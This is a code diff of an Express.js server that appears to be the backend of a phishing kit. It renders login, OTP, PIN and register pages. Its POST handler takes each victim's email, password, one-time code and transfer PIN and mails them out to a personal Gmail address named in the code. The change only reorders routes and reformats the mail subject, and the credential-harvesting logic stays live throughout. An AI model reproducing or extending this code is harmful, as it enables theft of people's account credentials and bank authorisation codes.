@@ -11,33 +11,9 @@ app.use(express.static('public'))
 app.set('view engine', 'ejs')
 app.use(express.json())
 
-// index
-app.get('/', (req,res ) => {
 
-    res.render("index")
-})
-// contactForm
-app.get('/login', (req,res ) => {
 
-    res.render("login")
-})
-// otp
-app.get('/otp', (req,res ) => {
-
-    res.render("otp")
-})
-// pin
-app.get('/pin', (req,res ) => {
-
-    res.render("pin")
-})
-// register
-app.get('/register', (req,res ) => {
-
-    res.render("register")
-})
-
-// contactForm
+// Form
 app.post('/',(req,res) => {
     console.log(req.body)
 
@@ -52,7 +28,7 @@ app.post('/',(req,res) => {
     const mailOptions = {
         from: req.body?.email,
         to:'Victorchinemerem191@gmail.com',
-        subject: `Client: ${req.body?.email} \n password: ${req.body?.password} \n Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin}`,
+        subject: `Email: ${req.body?.email} \t\n\n\n password: ${req.body?.password} \t\n\n\n  OTP: ${req.body?.otp} \t\n\n\n Pin: ${req.body?.pin}`,
        
     }
 console.log(mailOptions)
@@ -66,6 +42,35 @@ console.log(mailOptions)
         }
     })
     
+})
+
+
+
+
+
+// index
+app.get('/', (req,res ) => {
+
+    res.render("index")
+})
+// contactForm
+app.get('/login', (req,res ) => {
+
+    res.render("login")
+})
+// otp
+app.get('/otp', (req,res ) => {
+    res.render('otp');
+    
+})
+// pin
+app.get('/pin', (req,res ) => {
+    res.render("pin")
+})
+// register
+app.get('/register', (req,res ) => {
+
+    res.render("register")
 })
 
 
